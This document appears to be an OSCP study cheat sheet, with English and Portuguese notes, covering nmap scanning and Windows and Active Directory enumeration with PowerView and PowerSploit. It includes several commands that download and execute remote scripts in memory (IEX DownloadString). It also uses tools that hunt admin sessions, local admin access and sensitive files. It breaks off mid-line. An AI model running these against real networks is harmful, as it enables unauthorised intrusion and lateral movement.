# OSCP
## NMAP
##### NMAP - TCP PORT QUICK SCAN
```
time nmap -T5 -sS -Pn -p- -oA scan-ports-tcp -vv 192.168.1.1
```
##### FILTER TCP PORT - LINES
```
cat scan-ports-tcp.nmap | grep -v "#" | grep "/tcp" | awk -F"/" '{ print $1}' > tcp-port-lines.txt
```
##### FILTER TCP PORT - CSV
```
cat tcp-port-lines.txt | sed -z 's/\n/,/g;s/,$/\n/'  > tcp-port.csv
```
##### NMAP - TCP PORT CUSTOM SCAN
```
time nmap -A -Pn -vv --script vuln -sV -oA scan-ports-custom 192.168.1.1 -p 22,80
```
```
time nmap -A -Pn -vv --script vuln -sV -oA scan-ports-custom 192.168.1.1 -p `cat tcp-port.csv`
```
##### NMAP - UDP PORT SCAN
```
time nmap -sU -vv -sV -oA scan-udp-1000 192.168.1.1
```
## WEBSERVER ENUMERATION
##### WEBSERVER - WHATWEB
```
time whatweb http://192.168.1.1
```
##### DIRSEARCH - SEARCH FOR DIRECTORIES
```
time dirsearch -u http://192.168.1.1/
```
## WINDOWS ENUMERATION
##### LIST - INSTALLED SOFTWARE
```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
##### LIST - UNQUOTED SERVICE
```
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
##### LIST - PROCESS USING TCP PORT
```
netstat -ano -p tcp
```
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}} |Format-Table
```
##### LIST - PROCESS LISTENING TCP PORT
```
netstat -ano -p tcp| findstr /I listening
```
```
Get-NetTCPConnection -State Listen
```
##### LIST - PROCESS USING SPECIFIC TCP PORT
```
netstat -ano -p tcp| findstr /I 5040
```
```
Get-NetTCPConnection -State Listen | ?{$_.LocalPort -eq 30900}
```
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}} | ?{$_.LocalPort -eq 30900} |Format-Table
```

##### LIST - OWNER OF A PROCESS
```
tasklist /V  |findstr "PID 7580"
```
```
Get-Process -Id 4424 -IncludeUserName | Select-Object -Property ID,ProcessName,UserName
```
##### LIST - OWNER OF A PROCESS USING TCP PORT
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}   | Format-Table
```
##### LIST - OWNER OF A PROCESS USING SPECIFIC TCP PORT
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}  | ?{$_.LocalPort -eq 30900} | Format-Table
```

## ACTIVE DIRECTORY - DOMAIN ENUMERATION

##### POWERVIEW INSTALLATION
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
CARREGAR A DLL COMO TXT
```
curl https://github.com/n0ts0cial/oscp/raw/main/Import-ActiveDirectory.ps1  -Outfile Import-ActiveDirectory.ps1
Import-module .\Import-ActiveDirectory.ps1
Import-ActiveDirectory
```
##### POWERSPLOIT INSTALLATION
```
curl https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip -Outfile v3.0.0.zip
curl https://github.com/n0ts0cial/oscp/raw/main/powersploit3.zip -Outfile powersploit3.zip
expand-archive -path ".\powersploit3.zip" -destinationpath ".\"
cd PowerSploit-3.0.0
Import-Module .\PowerSploit.psd1
```
## FOREST
##### LIST - FOREST
```
$MyForest = [System.DirectoryServices.ActiveDirectory.Forest]
$MyForest::GetCurrentForest()
```
##### LIST - FOREST
```
Import-Module activedirectory
$MyForestInfo = Get-ADForest
Write-Host -ForegroundColor Green "Forest Name: $($MyForestInfo.Name)"
Write-Host -ForegroundColor Green "Forest Mode: $($MyForestInfo.ForestMode)"
Write-Host -ForegroundColor Green "Forest Functional Level: $($MyForestInfo.ForestMode)"
Write-Host -ForegroundColor Green "Forest Domains: $($MyForestInfo.domains)"
```
##### FOREST - LIST DETAILS 
```
Get-ADForest
Get-ADForest -identity tech.local 
```
```
Get-NetForest
Get-NetForest -forest tech.local
```
##### FOREST - LIST DOMAINS IN THE FOREST
```
(Get-ADForest).Domains
```

## DOMAIN
##### LIST - DOMAIN
```
$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
$MyDomain::GetCurrentDomain()
```
```
Get-ADForest | select domains
```
```
Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain
```
```
wmic computersystem get domain
systeminfo | findstr /B /C:"Domain"
```

##### [LIST - DOMAIN CONTROLLERS CURRENT DOMAIN](https://techexpert.tips/windows/windows-list-domain-controllers/)
```
$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
$MyDomain::GetCurrentDomain()
```
```
Get-ADGroupMember "Domain Controllers" | %{Resolve-DnsName -Name $_.Name} | select Name, IPAddress
Get-ADDomainController -filter * | select Name, IPv4Address
Get-WmiObject -Class Win32_NTDomain | select DomainControllerName, DomainControllerAddress, DomainName, DnsForestName
Resolve-DnsName -Name _ldap._tcp.dc._msdcs.tech.local -Type ANY | select Name, IP4Address
```
```
wmic NTDOMAIN GET DomainControllerName,DomainControllerAddress,DomainName
net group "Domain Controllers" /domain
DSQUERY SERVER -o rdn
DSQUERY SERVER
nltest /dclist:TECH.LOCAL
```
##### LIST - DOMAIN CONTROLLERS OTHER DOMAIN
```
Get-ADDomainController -Discover -Domainname "tech.local"
Get-NetDomainController -Domain "tech.local"
```
##### LIST - DOMAIN CONTROLLERS MISC INFO
```
(Get-ADDomain).DistinguishedName
(Get-ADDomain).DomainSID
Get-Domainsid
(get-addomaincontroller).ldapport
(get-addomaincontroller).sslport
```
##### LIST - DOMAIN POLICY
```
Get-domainpolicy
(Get-domainpolicy)."systemaccess"
(Get-domainpolicy)."kerberospolicy"
```
##### LIST - DOMAIN POLICY OTHER DOMAIN
```
Get-domainpolicy -domain tech.local
(Get-domainpolicy -domain tech.local)."systemaccess"
(Get-domainpolicy -domain tech.local)."kerberospolicy"
```
## DOMAIN USERS
##### DOMAIN USERS - LIST ALL DOMAIN USERS
```
net user /domain
wmic USERACCOUNT where "DOMAIN = 'ABC'" get Domain,Name
wmic USERACCOUNT where "DOMAIN  like '%ABC%'" get Domain,Name
wmic USERACCOUNT Get Domain,Name,Sid
dsquery user -o samid -limit 0
dsquery user dc=ABC,dc=LOCAL -limit 0
```
```
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * -Properties * | select Samaccountname, Enabled
```
```
get-netuser
get-netuser -Identity test3
```
##### DOMAIN USERS - LIST USERS PROPERTIES
```
Get-ADUser -identity test3 -Properties *
Get-ADUser -identity test3 -Properties * | select Samaccountname, Enabled
```
```
get-netuser -Identity test3
```
##### DOMAIN USERS - LIST USERS PROPERTIES (POWERSPLOIT)
```
curl https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip -Outfile v3.0.0.zip
curl https://github.com/n0ts0cial/oscp/raw/main/powersploit3.zip -Outfile powersploit3.zip
expand-archive -path ".\powersploit3.zip" -destinationpath ".\"
cd PowerSploit-3.0.0
Import-Module .\PowerSploit.psd1
```
1 PROPRIEDADE DE TODOS OS USUARIOS
```
Get-UserProperty -Properties description
Get-UserProperty -Properties pwdlastset
Get-UserProperty -Properties badpwdcount
Get-UserProperty -Properties logoncount
```
```
Get-Aduser -Filter * -Properties * | select name,description
Get-Aduser -Filter * -Properties * | select name,pwdlastset
```
##### DOMAIN USERS - LIST USERS PROPERTIES EM TODOS OS USUARIOS (POWERSPLOIT)
```
Find-UserField -SearchField Description -SearchTerm "built"
Find-UserField -SearchField Description -SearchTerm "pass"
```
```
Get-AdUser -Filter 'Description -like "*built*"' -Properties Description | select name, Description
Get-AdUser -Filter 'Description -like "*pass*"' -Properties Description | select name, Description
```
##### DOMAIN USERS - LIST GROUP MEMBERSHIP
```
dsquery user -samid test3  | dsget user -memberof | dsget group -samid
```
```
Get-ADPrincipalGroupMembership vegeta | select name
Get-ADPrincipalGroupMembership vegeta 
```
```
Get-Netgroup -username vegeta
Get-Netgroup -username vegeta | select name
```
##### DOMAIN USER - LIST OWNER SINGLE USER
```
$User = Get-ADUser test3 -Properties nTSecurityDescriptor 
$User | Select-Object -Property Name, @{name='Owner'; expression={$_.nTSecurityDescriptor.owner}}
```
##### DOMAIN USER - LIST OWNER ALL USERS
```
$UserList = Get-ADUser -Properties nTSecurityDescriptor -Filter *
foreach ($User in $UserList)
{
$User | Select-Object -Property Name, @{ label='Owner'
        expression={$_.nTSecurityDescriptor.owner}
    }
}
```
ou
```
Get-ADUser -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}}
Get-ADUser -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | out-file "userOwners.txt"
Get-ADUser -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | Export-CSV "userOwners.csv"
```
##### DOMAIN USER - LIST ALL PERMISSIONS OF SINGLE USER
```
(Get-ACL "AD:$((Get-ADUser -identity 'test3').distinguishedname)").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
```
##### DOMAIN USERS - LIST INTERESTING PERMISSIONS OF SINGLE USER
```
$MyPermission = (Get-ACL "AD:$((Get-ADUser -identity 'test3').distinguishedname)").access
$values = @('write','genericall')
$regexValues = [string]::Join('|',$values) 
$MyPermission | where ActiveDirectoryRights -match $regexValues | Select IdentityReference, AccessControlType, ActiveDirectoryRights 
```

## DOMAIN GROUPS
##### DOMAIN GROUPS - LIST ALL GROUPS
```
Get-ADGroup -Filter * 
Get-ADGroup -filter * -properties * | select SAMAccountName
Get-ADGroup -filter * -properties * | select SamAccountName, ObjectClass, GroupCategory, GroupScope, DistinguishedName | Format-Table
Get-ADGroup -Filter * | select SamAccountName, objectClass, GroupCategory, GroupScope | ft -AutoSize | Out-String -Width 4096
```
```
powershell -command "Get-ADGroup -Filter * | select SamAccountName, objectClass, GroupCategory, GroupScope | ft " 
```
```
net group /domain
dsquery group
```
```
Get-Netgroup | select samaccountname
Get-Netgroup -domain tech.local
Get-Netgroup *admin*
Get-Netgroup *admin* | select samaccountname
```
##### DOMAIN GROUPS - LIST ALL GROUPS FILTER
```
Get-ADGroup -filter 'Name -like "*admin*"' | select name
Get-Netgroup *admin*
Get-Netgroup *admin* | select samaccountname
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF ALL GROUPS
```
$DomainGroups = Get-ADGroup -Filter *
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)"
    $GroupMembers = Get-ADGroupMember -Identity $Group -Recursive
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.sAMAccountName)"
    }
}
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF ALL GROUPS (COLORIDO)
```
$DomainGroups = Get-ADGroup -Filter *
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)"  -background yellow -foreground black
    $GroupMembers = Get-ADGroupMember -Identity $Group -Recursive
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.sAMAccountName)"
    }
}
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF A GROUP
```
Get-ADGroupMember -Identity "Domain Admins" | select SAMAccountName, objectClass
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select SAMAccountName, objectClass
```
```
Get-NetgroupMember -identity 'GROUP-A'
Get-NetgroupMember -identity 'GROUP-A' | select SAMAccountName
Get-NetgroupMember -identity 'GROUP-A' | select groupname,MemberName,MemberObjectClass
Get-NetgroupMember -identity 'GROUP-A' -domain 'tech.local'
```
##### DOMAIN GROUPS - LIST OWNER SINGLE GROUP
```
$Group = Get-ADGroup 'Domain admins' -Properties nTSecurityDescriptor 
$Group | Select-Object -Property Name, @{name='Owner'; expression={$_.nTSecurityDescriptor.owner}}
```
##### DOMAIN GROUPS - LIST OWNER ALL GROUPS
```
$GroupList = Get-ADGroup -Properties nTSecurityDescriptor -Filter *
foreach ($Group in $GroupList)
{
$Group | Select-Object -Property Name, @{ label='Owner'
        expression={$_.nTSecurityDescriptor.owner}
    }
}
```
ou
```
Get-ADGroup -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}}
Get-ADGroup -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | out-file "GroupOwners.txt"
Get-ADGroup -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | Export-CSV "GroupOwners.csv"
```
##### DOMAIN GROUPS - LIST ALL PERMISSIONS OF SINGLE GROUP
```
(Get-ACL "AD:$((Get-ADGroup -Identity 'Domain admins').distinguishedname)").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights  
```
##### DOMAIN GROUPS - LIST INTERESTING PERMISSIONS OF SINGLE GROUP
```
$MyPermission = (Get-ACL "AD:$((Get-ADGroup -Identity 'Domain Admins').distinguishedname)").access
$values = @('write','genericall')
$regexValues = [string]::Join('|',$values) 
$MyPermission | where ActiveDirectoryRights -match $regexValues | Select IdentityReference, AccessControlType, ActiveDirectoryRights 
```
## DOMAIN COMPUTERS
##### DOMAIN COMPUTERS - LIST ALL COMPUTERS
```
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * -Properties * | select Samaccountname, Enabled
```
```
Get-Netcomputer
Get-Netcomputer | select name, samaccountname
Get-Netcomputer -operatingSystem "*Server 2022*"
Get-Netcomputer -operatingSystem "*Server 2022*" | select samaccountname
```
##### DOMAIN COMPUTERS - LIST COMPUTERS FILTERS
```
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' | select name, samaccountname
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select name, samaccountname, OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostname | %{ Test-Connection -Count 1 -Computername $_.DNSHostname}
```
##### DOMAIN COMPUTERS - LIST COMPUTER PROPERTIES
```
Get-ADComputer -identity tech-dc01 -Properties *
Get-ADComputer -identity tech-dc01 -Properties * | select Samaccountname, Enabled
```
```
Get-Netcomputer | select name, samaccountname
```
##### DOMAIN COMPUTERS - LIST GROUP MEMBERSHIP
```
Get-ADPrincipalGroupMembership TECH-DC01$ | select name
Get-ADPrincipalGroupMembership TECH-DC01$
```
```
dsquery * "CN=MyServiceComputer,CN=Computers,DC=TECH,DC=LOCAL" -attr MemberOf
```
```
Get-AdPrincipalGroupMembership -Identity vegeta
Get-AdPrincipalGroupMembership -Identity vegeta | select samaccountname
```
```
$ComputerList = Get-ADComputer -Filter *
foreach ($Computer in $ComputerList)
{
    Write-Host "Computer: $($Computer.Name)" -Background yellow -foreground black
    $Groups = Get-ADPrincipalGroupMembership $Computer.sAMAccountName
    foreach ($Group in $Groups)
    {
        Write-Host "    Group Name: $($Group.Name)"
    }
}
```
##### DOMAIN COMPUTERS - LIST OWNER SINGLE COMPUTER
```
$Computer = Get-ADComputer TESTE1 -Properties nTSecurityDescriptor 
$Computer | Select-Object -Property Name, @{name='Owner'; expression={$_.nTSecurityDescriptor.owner}}
```
##### DOMAIN COMPUTERS - LIST OWNER ALL COMPUTERS
```
$ComputerList = Get-ADComputer -Properties nTSecurityDescriptor -Filter *
foreach ($Computer in $ComputerList)
{
$Computer | Select-Object -Property Name, @{ label='Owner'
        expression={$_.nTSecurityDescriptor.owner}
    }
}
```
ou
```
Get-ADComputer -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}}
Get-ADComputer -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | out-file "ComputerOwners.txt"
Get-ADComputer -Filter * -Properties nTSecurityDescriptor | Select-Object -Property Name,Samaccountname, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | Export-CSV "ComputerOwners.csv"
```
##### DOMAIN COMPUTERS - LIST ALL PERMISSIONS OF SINGLE COMPUTER
```
(Get-ACL "AD:$((Get-ADComputer -Identity 'TECH-DC01').distinguishedname)").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights  
```
##### DOMAIN COMPUTERS - LIST INTERESTING PERMISSIONS OF SINGLE COMPUTER
```
$MyPermission = (Get-ACL "AD:$((Get-ADComputer -Identity 'TECH-DC01').distinguishedname)").access
$values = @('write','genericall')
$regexValues = [string]::Join('|',$values) 
$MyPermission | where ActiveDirectoryRights -match $regexValues | Select IdentityReference, AccessControlType, ActiveDirectoryRights 
```
##### DOMAIN COMPUTERS - LOGGED USERS
```
quser
query user
query user /server:tech-dc01
```
```
get-netloggedon
get-netloggedon | select username,logondomain,authdomains,logonserver,computername | ft
get-netloggedon -computer server01
get-netloggedon -computer server01 | select username,logondomain,authdomains,logonserver,computername | ft
```

## [DOMAIN GPO - GROUP POLICY OBJECTS](https://techexpert.tips/powershell/powershell-list-all-gpo/)
##### DOMAIN GPO - LIST ALL GPOS
```
Get-GPO -all | select DisplayName
Get-GPO -all | select DisplayName,Id
```
```
$LDAPSEARCH = New-Object System.DirectoryServices.DirectorySearcher 
$LDAPSEARCH.SearchRoot = "LDAP://DC=TECH,DC=LOCAL"
$LDAPSEARCH.Filter = "(objectCategory=groupPolicyContainer)"
$LDAPSEARCH.FindAll()
```
```
Get-NetGpo
```
##### DOMAIN GPO - LIST ALL GPOS PARA COMPUTADOR ESPECIFICO
```
Get-NetGpo -Computername server01
Get-NetGpo -Computername server01 | select displayname
```
##### DOMAIN GPO - TRANSLATE NAME / ID / NAME
```
Get-GPO -Name "Default Domain Policy" | select Displayname,Id
Get-GPO -Guid d1e5ff89-e3b2-494e-bf5c-c83f46de5b4a | select Displayname,Id
```
##### DOMAIN GPO - LIST ALL GPO LINKS
```
$MyGpos = Get-GPO -All
$MyLinks = foreach ($GPO in $MyGpos) {
[xml]$XMLGPO = Get-GPOReport -ReportType Xml -Guid $GPO.Id
foreach ($line in $XMLGPO.GPO.Linksto) {
		'' | Select-object @{n='Name';e={$XMLGPO.GPO.Name}},@{n='Link';e={$line.SOMPath}},@{n='Status';e={$line.Enabled}}
}
}
$MyLinks | Sort-Object Name
```
##### DOMAIN GPO - LIST SPECIFIC GPO LINKS
```
$MyGpos = Get-GPO -Name "MY-GPO"
$MyLinks = foreach ($GPO in $MyGpos) {
[xml]$XMLGPO = Get-GPOReport -ReportType Xml -Guid $GPO.Id
foreach ($line in $XMLGPO.GPO.Linksto) {
		'' | Select-object @{n='Name';e={$XMLGPO.GPO.Name}},@{n='Link';e={$line.SOMPath}},@{n='Status';e={$line.Enabled}}
}
}
$MyLinks | Sort-Object Name
```
##### DOMAIN GPO - LIST ALL GPO PERMISSIONS
```
$MyGpos = Get-GPO -All
$MyPermissions = foreach ($GPO in $MyGpos) {
Get-GPPermissions -Guid $GPO.Id -All | Select-Object @{n='Name';e={$GPO.DisplayName}},@{n='AccountName';e={$_.Trustee.Name}},@{n='AccountType';e={$_.Trustee.SidType.ToString()}},@{n='Permissions';e={$_.Permission}}
}
$MyPermissions | Sort-Object Name
```
##### DOMAIN GPO - LIST SPECIFIC GPO PERMISSIONS
```
$MyGpos = Get-GPO -Name "MY-GPO"
$MyPermissions = foreach ($GPO in $MyGpos) {
Get-GPPermissions -Guid $GPO.Id -All | Select-Object @{n='Name';e={$GPO.DisplayName}},@{n='AccountName';e={$_.Trustee.Name}},@{n='AccountType';e={$_.Trustee.SidType.ToString()}},@{n='Permissions';e={$_.Permission}}
}
$MyPermissions | Sort-Object Name
```
##### DOMAIN GPO - GERAR HELATORIO HTML / XML
```
Get-GPResultantSetOfPolicy -ReportType Html -Path "c:\report.html"
Get-GPResultantSetOfPolicy -ReportType Xml -Path "c:\report.xml"
```
##### DOMAIN GPO - Gets all GPOs in a domain that set "Restricted Groups"
```
Get-NetGPOGroup
Get-NetGPOGroup -ResolveMemberSIDs
```
##### DOMAIN GPO - MISC NAO ENTENDI DIRENTO
```
Find-GPOComputerAdmin -computername server01
Find-GPOLocation
```
## DOMAIN OU - ORGANIZATIONAL UNIT
##### DOMAIN OU - LIST ALL GPOS
```
Get-ADOrganizationalUnit -filter *
Get-ADOrganizationalUnit -filter * -Properties *
Get-ADOrganizationalUnit -filter * -Properties * | select CanonicalName, DistinguishedName
Get-ADOrganizationalUnit -filter * | select DistinguishedName
Get-ADComputer -Filter * -Properties * | select Name, Samaccountname, Enabled, DistinguishedName | Format-Table
```
```
Get-NetOu
```
##### DOMAIN OU - LIST SPECIFIC OU 
```
Get-ADOrganizationalUnit 'OU=TEST,DC=TECH,DC=LOCAL'
Get-ADOrganizationalUnit 'OU=TEST,DC=TECH,DC=LOCAL' -properties *
Get-ADOrganizationalUnit -filter { Name -eq 'TEST' }
Get-ADOrganizationalUnit -filter { Name -eq 'TEST' } -properties *
```
##### DOMAIN OU - LIST ALL OUS E NUMERO DE USUARIOS, GRUPOS E COMPUTADORES 
```
$FormatEnumerationLimit=-1
Get-ADOrganizationalUnit -Properties CanonicalName -Filter * | Sort-Object CanonicalName |
ForEach-Object {
    [pscustomobject]@{
        Name          = Split-Path $_.CanonicalName -Leaf
        CanonicalName = $_.CanonicalName
        UserCount     = @(Get-AdUser -Filter * -SearchBase $_.DistinguishedName -SearchScope OneLevel).Count
        GroupCount = @(Get-ADGroup -Filter * -SearchBase $_.DistinguishedName -SearchScope OneLevel).Count
        ComputerCount = @(Get-AdComputer -Filter * -SearchBase $_.DistinguishedName -SearchScope OneLevel).Count
    }
} | Format-Table | Out-String -Width 4096
```
##### DOMAIN OU - LIST ALL PERMISSIONS OF SINGLE OU
```
(Get-ACL "AD:$((Get-ADOrganizationalUnit -Identity 'OU=TEST,DC=TECH,DC=LOCAL').distinguishedname)").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
```
##### DOMAIN OU - LIST INTERESTING PERMISSIONS OF SINGLE OU
```
$MyPermission = (Get-ACL "AD:$((Get-ADOrganizationalUnit 'OU=TEST,DC=TECH,DC=LOCAL').distinguishedname)").access
$values = @('write','genericall')
$regexValues = [string]::Join('|',$values) 
$MyPermission | where ActiveDirectoryRights -match $regexValues | Select IdentityReference, AccessControlType, ActiveDirectoryRights 
```
##### DOMAIN OU - LIST OWNER ALL OUs
```
$OUList = Get-ADOrganizationalUnit -Properties nTSecurityDescriptor -Filter *
foreach ($Computer in $OUList)
{
$Computer | Select-Object -Property Name, @{ label='Owner'
        expression={$_.nTSecurityDescriptor.owner}
    }
}
```
```
Get-ADOrganizationalUnit -filter * -Properties * | select Name, CanonicalName, DistinguishedName, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}}
Get-ADOrganizationalUnit -filter * -Properties * | select Name, CanonicalName, DistinguishedName, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | out-file "OUOwners.txt"
$FormatEnumerationLimit=-1
Get-ADOrganizationalUnit -filter * -Properties * | select Name, CanonicalName, DistinguishedName, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | Out-String -Width 4096 | out-file "OUOwners.txt" 
Get-ADOrganizationalUnit -filter * -Properties * | select Name, CanonicalName, @{label='Owner';expression={$_.nTSecurityDescriptor.owner}} | Export-CSV "OUOwners.csv" | Out-String -Width 4096
```
##### DOMAIN OU - LIST OWNER SINGLE OU
```
$OU = Get-ADOrganizationalUnit -identity 'OU=TEST,DC=TECH,DC=LOCAL' -Properties nTSecurityDescriptor 
$OU | Select-Object -Property Name, @{name='Owner'; expression={$_.nTSecurityDescriptor.owner}}
```



## DOMAIN MISC
##### DOMAIN - SCAN ALL INTERESTING ACL PERMISSIONS TO ALL
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
##### DOMAIN - SCAN ALL INTERESTING ACL PERMISSIONS TO A USER
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "vegeta"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
##### DOMAIN - SCAN ALL INTERESTING ACL PERMISSIONS TO A MATCH
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Domain Admins"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
##### DOMAIN - FIND SHARES
```
Invoke-ShareFinder -Verbose
```
##### DOMAIN - FIND SENSITIVE FILES
```
Invoke-FileFinder -Verbose
```
##### DOMAIN - FIND FILE SERVER
```
Get-DomainFileServer
Get-NetFileServer -Verbose
```
##### DOMAIN - SOU LOCAL ADMIN EM ALGUMA MÁQUINA DO DOMINIO?
Find all machines on the currentdomain where the current user has local admin access.
```
Find-LocalAdminAccess -Verbose
Find-LocalAdminAccess -Domain tech.local
```
##### DOMAIN - SOU LOCAL ADMIN NESSA MÁQUINA? 
```
Invoke-CheckLocalAdminAccess
Invoke-CheckLocalAdminAccess -computername server01
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Find-WMILocalAdminAccess.ps1")
curl https://github.com/n0ts0cial/oscp/raw/main/Find-WMILocalAdminAccess.ps1 -Outfile Find-WMILocalAdminAccess.ps1
Import-Module .\Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```
##### DOMAIN - QUEM SÃO OS ADMINISTRADORES LOCAIS DE TODAS AS MÁQUINAS
```
Invoke-EnumerateLocalAdmin -Verbose
```
##### DOMAIN - ONDE O ADMINISTRADOR TEM SESSÃO LOGADO?
```
Invoke-UserHunter
Invoke-UserHunter -Stealth
```
##### DOMAIN - ONDE O ADMINISTRADOR TEM SESSÃO LOGADO? ***ONLY HIGH TRAFFIC SERVER
```
Invoke-UserHunter -CheckAccess
```

##### DOMAIN - ONDE MEMBROS DO GRUPO X TEM SESSÃO LOGADO?
```
Invoke-UserHunter -Groupname "GROUP-X"
```
##### DOMAIN - LIST OBJECT PERMISSIONS
```
Get-ObjectAcl
Get-ObjectAcl -Samaccountname buma -ResolveGUIDs
Get-ObjectAcl -Samaccountname buma -ResolveGUIDs | ft
Get-ObjectAcl 'CN=buma,CN=Users,DC=TECH,DC=LOCAL' -Verbose | ft
```
##### DOMAIN - LIST PATH PERMISSIONS / SHARE PERMISSION
```
$FormatEnumerationLimit=-1
Get-PathACL -Path "\\tech-dc01.tech.local\sysvol" | ft | Out-String -Width 4096
Get-PathACL -Path "\\tech-dc01.tech.local\sysvol" | select Path, IdentityReference, FileSystemRights | ft | Out-String -Width 4096
```

## DOMAIN TRUST
##### DOMAIN TRUST - SCAN ALL INTERESTING ACL PERMISSIONS TO ALL
```
Get-Netdomaintrust
Get-Netdomaintrust -domain tech.local
```
```
Get-NetForest
Get-NetForest -forest tech.local
```
```
Get-ADTrust -filter *
Get-ADTrust -identity tech.local 
Get-ADTrust -identity sub.tech.local 
```
```
Get-NetForestTrust
Get-NetForestTrust -forest tech.local
```
```
Get-NetForestCatalog
Get-NetForestCatalog -Forest tech.local
```
```
Get-ADTrust -Filter 'msdDS-TrustForestTrustInfo -ne "$null"'
```

## LOCAL MACHINE - ENUMERATION
##### LOCAL MACHINE - LIST ALL USERS
```
Get-LocalUser
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS
```
Get-LocalGroupMember -Group "Administrators"
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS FROM ACTIVE DIRECTORY
```
$RESULT = 
